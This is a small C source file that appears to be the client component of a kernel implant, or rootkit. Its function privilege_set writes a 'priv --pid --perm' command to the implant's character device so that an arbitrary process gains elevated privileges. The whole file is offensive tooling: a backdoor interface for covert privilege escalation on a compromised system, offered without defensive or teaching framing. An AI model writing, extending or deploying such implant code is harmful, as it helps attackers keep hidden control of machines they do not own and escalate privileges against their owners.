#include <client.h>
#include <privilege.h>
#include <debug.h>

#include <stdio.h>

int privilege_set(pid_t pid, int perm)
{
	FILE *implant = fopen(IMPLANT_CHRDEV_PATH, "w");
	if (implant == NULL) {
		IMLOG_WARN("Failed to access the implant interface");
		return -1;
	}

	int ret = fprintf(implant, "priv --pid %d --perm %d", pid, perm);
	if (ret < 0) {
		IMLOG_DEBUG("Failed to write to the implant interface");
		return -1;
	}

	fclose(implant);
	return 0;
}
